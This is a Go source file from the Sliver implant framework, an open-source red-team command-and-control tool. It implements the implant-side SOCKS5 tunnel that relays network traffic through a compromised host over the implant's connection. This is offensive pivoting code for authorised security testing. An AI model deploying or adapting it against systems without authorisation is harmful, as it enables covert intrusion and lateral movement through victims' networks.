package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/things-go/go-socks5"
	"google.golang.org/protobuf/proto"
)

type socksTunnelPool struct {
	tunnels *sync.Map // map[uint64]chan []byte
}

var socksTunnels = socksTunnelPool{
	tunnels: &sync.Map{},
}

var socksServer *socks5.Server

func SocksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	socksData := &sliverpb.SocksData{}
	err := proto.Unmarshal(envelope.Data, socksData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}
	if socksData.Data == nil {
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
	// {{end}}

	if socksData.Username != "" && socksData.Password != "" {
		cred := socks5.StaticCredentials{
			socksData.Username: socksData.Password,
		}
		auth := socks5.UserPassAuthenticator{Credentials: cred}
		socksServer = socks5.NewServer(
			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
		)
	} else {
		socksServer = socks5.NewServer()
	}

	// {{if .Config.Debug}}
	log.Printf("[socks] Server: %v", socksServer)
	// {{end}}

	// init tunnel
	if tunnel, ok := socksTunnels.tunnels.Load(socksData.TunnelID); !ok {
		tunnelChan := make(chan []byte, 10)
		socksTunnels.tunnels.Store(socksData.TunnelID, tunnelChan)
		tunnelChan <- socksData.Data
		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[socks] Failed to serve connection: %v", err)
			// {{end}}
			return
		}
	} else {
		tunnel.(chan []byte) <- socksData.Data
	}
}

var _ net.Conn = &socks{}

type socks struct {
	stream *sliverpb.SocksData
	conn   *transports.Connection
	// mux      sync.Mutex
	Sequence uint64
}

func (s *socks) Read(b []byte) (n int, err error) {
	channel, ok := socksTunnels.tunnels.Load(s.stream.TunnelID)
	if !ok {
		return 0, errors.New("[socks] invalid tunnel id")
	}

	data := <-channel.(chan []byte)
	return copy(b, data), nil
}

func (s *socks) Write(b []byte) (n int, err error) {
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID: s.stream.TunnelID,
		Data:     b,
		Sequence: atomic.LoadUint64(&s.Sequence),
	})
	if !s.conn.IsOpen {
		return 0, err
	}
	// {{if .Config.Debug}}
	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", atomic.LoadUint64(&s.Sequence), len(b), b)
	// {{end}}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}

	atomic.AddUint64(&s.Sequence, 1)
	return len(b), err
}

func (s *socks) Close() error {
	channel, ok := socksTunnels.tunnels.LoadAndDelete(s.stream.TunnelID)
	if !ok {
		return errors.New("[socks] can't close unknown channel")
	}
	close(channel.(chan []byte))

	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID:  s.stream.TunnelID,
		CloseConn: true,
	})
	if !s.conn.IsOpen {
		return err
	}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}
	return err
}

func (c *socks) LocalAddr() net.Addr {
	return nil
}

func (c *socks) RemoteAddr() net.Addr {
	return &net.IPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Zone: "",
	}
}

// TODO impl
func (c *socks) SetDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetReadDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetWriteDeadline(t time.Time) error {
	return nil
}
